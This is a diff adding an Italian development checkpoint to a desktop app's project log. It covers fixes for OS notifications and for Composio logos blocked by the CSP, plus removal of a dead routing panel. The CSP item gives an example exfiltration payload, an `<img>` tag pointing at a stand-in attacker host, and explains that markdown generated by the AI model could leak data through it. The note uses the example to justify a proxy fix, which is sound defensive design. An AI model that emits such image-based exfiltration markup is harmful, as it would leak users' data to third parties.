@@ -5,6 +5,41 @@
 > compattazione o a inizio sessione.
 > **Ultimo aggiornamento: 2026-07-14.**
 
+## ⭐ CHECKPOINT 2026-07-14 (ter) — tre bug segnalati da Fabio: notifiche, icone Composio, pannello morto
+
+1. **Notifiche di sistema — rotte su TUTTI gli OS, e in silenzio.** Il "Test" non faceva nulla.
+   Causa: le notifiche partivano dal **renderer** con la Web Notification API, ma Electron ha DUE
+   canali per i permessi — il *request handler* (`main.cjs`, negava tutto tranne `media`) e il *check
+   handler* (**non impostato** → default: concedi). Il renderer leggeva quindi
+   `Notification.permission === "granted"`, il toggle si accendeva, `new Notification()` non lanciava
+   eccezioni… e l'OS non riceveva nulla. Prova: macOS non aveva Homun tra le app registrate in
+   `com.apple.ncprefs` (56 app presenti, Homun assente) → la notifica non ha MAI raggiunto il sistema.
+   Fix: le notifiche partono dal **processo MAIN** (`Notification` nativa di Electron, `lfpa:notify`) —
+   stesso comportamento su macOS/Windows/Linux, e fuori dal layer permessi. Aggiunto
+   **`app.setAppUserModelId("app.homun.desktop")`**, senza cui le toast di **Windows** vengono scartate
+   in silenzio. `setPermissionCheckHandler` ora concorda col request handler. `showSystemNotification`
+   resta UNA funzione (fallback Web API per il web self-hosted) ma **ritorna `{shown, reason}`**: il
+   Test ora DICE se l'OS ha rifiutato, invece di tacere.
+2. **Icone Composio sparite** (regressione da `39d3cc8e`, "P1 hardening"): la CSP
+   `img-src 'self' data: blob:` blocca ogni immagine remota → i loghi https di Composio fallivano →
+   `onError` → fallback alla lettera iniziale. Visibile **solo nell'app pacchettizzata** (la CSP si
+   applica se `app.isPackaged`), ecco perché era sfuggita. **Fix NON "aggiungi l'host alla CSP"**: il
+   renderer mostra markdown generato dal modello, quindi un `<img src="https://attaccante/?dati=…">` è
+   un canale di esfiltrazione — quella chiusura è deliberata e va difesa. Il **gateway fa da proxy**
+   (`GET /api/capabilities/composio/toolkits/{slug}/logo`, fuori dal layer bearer come `/api/ws` e
+   noVNC, perché un `<img>` non può mandare l'header; risolve per **slug**, mai per URL → niente SSRF;
+   cache in memoria). La CSP guadagna solo `http://127.0.0.1:*`, **nessuna origine remota**.
+   Validato live: 1000 toolkit, loghi SVG reali, 2ª richiesta dalla cache in ~2ms.
+3. **Pannello "Routing decisions" RIMOSSO**: non poteva popolarsi. Il writer `log_routing_decision` è
+   raggiungibile solo da `execute_subagent_task` → `brain_materialize_tasks` → l'endpoint
+   `POST /api/chat/.../create_task` che **nessun componente UI invoca**; il giro della chat non passa
+   mai da `resolve_role_for_task`. Non è un flag spento (`HOMUN_SEMANTIC_ROUTER` è ON di default): è un
+   **grafo di chiamate orfano**. Backend intatto; rimettere il pannello significa prima CABLARE il
+   router semantico nel giro della chat — decisione di prodotto (costa una chiamata modello per turno).
+
+Gate: `pre_release_gate.py` ALL GREEN, `npm run build`, `test:ui-contract`, `test:electron` (12/12).
+⚠️ Le notifiche vanno provate a mano su ogni OS (il Test ora riporta il motivo del rifiuto).
+
 ## ⭐ CHECKPOINT 2026-07-14 (bis) — vision routing: chi GUARDA l'immagine (ruolo `vision` + sub-turno)
 
 Seguito diretto del checkpoint qui sotto: le immagini ora **arrivano** al modello, ma nessuno controllava
